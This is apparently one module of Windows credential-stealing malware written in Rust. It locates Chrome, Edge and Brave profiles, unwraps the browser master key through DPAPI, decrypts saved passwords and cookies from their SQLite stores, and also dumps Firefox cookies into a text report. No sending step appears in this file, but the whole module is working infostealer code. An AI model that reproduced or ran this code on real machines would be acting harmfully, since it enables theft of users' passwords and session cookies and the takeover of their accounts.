// language: Rust, file: src/browsers.rs, target: Windows
// Harvest saved logins and cookies from Chromium browsers (Chrome/Edge/Brave) and
// Firefox cookies. Chromium secrets are DPAPI-wrapped AES-256-GCM.
#![cfg(windows)]
#![allow(dead_code)]
use base64::Engine;
use std::path::PathBuf;

fn dpapi_unprotect(data: &[u8]) -> Option<Vec<u8>> {
    use windows_sys::Win32::Foundation::LocalFree;
    use windows_sys::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};
    unsafe {
        let mut inb = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };
        let mut out = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };
        if CryptUnprotectData(
            &mut inb,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            0,
            &mut out,
        ) == 0
        {
            return None;
        }
        let v = std::slice::from_raw_parts(out.pbData, out.cbData as usize).to_vec();
        LocalFree(out.pbData as *mut core::ffi::c_void);
        Some(v)
    }
}

fn aes_gcm_decrypt(key: &[u8], blob: &[u8]) -> Option<Vec<u8>> {
    use aes_gcm::aead::{Aead, KeyInit};
    use aes_gcm::{Aes256Gcm, Nonce};
    if blob.len() < 15 + 16 {
        return None;
    }
    let nonce = &blob[3..15];
    let ct = &blob[15..];
    let cipher = Aes256Gcm::new_from_slice(key).ok()?;
    cipher.decrypt(Nonce::from_slice(nonce), ct).ok()
}

fn dec_value(key: Option<&[u8]>, v: &[u8]) -> Option<String> {
    if v.is_empty() {
        return None;
    }
    let plain = if v.starts_with(b"v10") || v.starts_with(b"v11") {
        key.and_then(|k| aes_gcm_decrypt(k, v))?
    } else {
        dpapi_unprotect(v)?
    };
    Some(String::from_utf8_lossy(&plain).to_string())
}

fn master_key(user_data: &PathBuf) -> Option<Vec<u8>> {
    let ls = std::fs::read_to_string(user_data.join("Local State")).ok()?;
    let v: serde_json::Value = serde_json::from_str(&ls).ok()?;
    let enc = v["os_crypt"]["encrypted_key"].as_str()?;
    let raw = base64::engine::general_purpose::STANDARD.decode(enc).ok()?;
    let raw = raw.strip_prefix(b"DPAPI").unwrap_or(&raw);
    dpapi_unprotect(raw)
}

fn copy_db(src: &PathBuf) -> Option<PathBuf> {
    if !src.exists() {
        return None;
    }
    let tmp = std::env::temp_dir().join(format!("bdb-{}.sqlite", uuid::Uuid::new_v4().simple()));
    std::fs::copy(src, &tmp).ok()?;
    Some(tmp)
}

fn harvest_chromium(label: &str, root: &PathBuf, out: &mut String) {
    if !root.exists() {
        return;
    }
    let key = master_key(root);
    let mut profiles = vec!["Default".to_string()];
    if let Ok(rd) = std::fs::read_dir(root) {
        for e in rd.flatten() {
            let n = e.file_name().to_string_lossy().to_string();
            if n.starts_with("Profile ") {
                profiles.push(n);
            }
        }
    }

    for prof in profiles {
        let dir = root.join(&prof);

        if let Some(db) = copy_db(&dir.join("Login Data")) {
            if let Ok(conn) = rusqlite::Connection::open(&db) {
                if let Ok(mut stmt) =
                    conn.prepare("SELECT origin_url, username_value, password_value FROM logins")
                {
                    if let Ok(rows) = stmt.query_map([], |r| {
                        Ok((
                            r.get::<_, String>(0)?,
                            r.get::<_, String>(1)?,
                            r.get::<_, Vec<u8>>(2)?,
                        ))
                    }) {
                        for row in rows.flatten() {
                            if let Some(pw) = dec_value(key.as_deref(), &row.2) {
                                out.push_str(&format!(
                                    "[{label}/{prof}] {}\n  user: {}\n  pass: {}\n",
                                    row.0, row.1, pw
                                ));
                            }
                        }
                    }
                }
            }
            let _ = std::fs::remove_file(&db);
        }

        if let Some(db) = copy_db(&dir.join("Network").join("Cookies")) {
            if let Ok(conn) = rusqlite::Connection::open(&db) {
                if let Ok(mut stmt) =
                    conn.prepare("SELECT host_key, name, encrypted_value FROM cookies")
                {
                    if let Ok(rows) = stmt.query_map([], |r| {
                        Ok((
                            r.get::<_, String>(0)?,
                            r.get::<_, String>(1)?,
                            r.get::<_, Vec<u8>>(2)?,
                        ))
                    }) {
                        let mut n = 0;
                        for row in rows.flatten() {
                            if let Some(val) = dec_value(key.as_deref(), &row.2) {
                                out.push_str(&format!(
                                    "[{label}/{prof}/cookie] {} {}={}\n",
                                    row.0, row.1, val
                                ));
                                n += 1;
                                if n > 200 {
                                    break;
                                }
                            }
                        }
                    }
                }
            }
            let _ = std::fs::remove_file(&db);
        }
    }
}

fn harvest_firefox(out: &mut String) {
    let root = PathBuf::from(std::env::var("APPDATA").unwrap_or_default())
        .join("Mozilla")
        .join("Firefox")
        .join("Profiles");
    if !root.exists() {
        return;
    }
    if let Ok(rd) = std::fs::read_dir(&root) {
        for e in rd.flatten() {
            if let Some(tmp) = copy_db(&e.path().join("cookies.sqlite")) {
                if let Ok(conn) = rusqlite::Connection::open(&tmp) {
                    if let Ok(mut stmt) =
                        conn.prepare("SELECT host, name, value FROM moz_cookies")
                    {
                        if let Ok(rows) = stmt.query_map([], |r| {
                            Ok((
                                r.get::<_, String>(0)?,
                                r.get::<_, String>(1)?,
                                r.get::<_, String>(2)?,
                            ))
                        }) {
                            for row in rows.flatten() {
                                out.push_str(&format!(
                                    "[firefox/cookie] {} {}={}\n",
                                    row.0, row.1, row.2
                                ));
                            }
                        }
                    }
                }
                let _ = std::fs::remove_file(&tmp);
            }
        }
    }
}

pub fn harvest() -> String {
    let mut out = String::new();
    let local = PathBuf::from(std::env::var("LOCALAPPDATA").unwrap_or_default());
    harvest_chromium(
        "chrome",
        &local.join("Google").join("Chrome").join("User Data"),
        &mut out,
    );
    harvest_chromium(
        "edge",
        &local.join("Microsoft").join("Edge").join("User Data"),
        &mut out,
    );
    harvest_chromium(
        "brave",
        &local
            .join("BraveSoftware")
            .join("Brave-Browser")
            .join("User Data"),
        &mut out,
    );
    harvest_firefox(&mut out);
    if out.is_empty() {
        out.push_str("(no browser credentials found)");
    }
    out
}
